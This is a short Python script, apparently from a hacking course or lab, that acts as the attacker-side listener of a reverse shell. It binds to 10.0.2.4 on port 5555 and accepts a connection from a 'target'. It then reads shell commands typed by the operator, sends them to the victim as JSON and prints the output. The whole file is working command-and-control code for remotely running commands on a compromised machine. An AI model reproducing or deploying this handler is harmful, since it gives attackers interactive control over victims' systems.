import socket
import json


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_communitcation():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.0.2.4', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connection From: ' + str(ip))

target_communitcation()
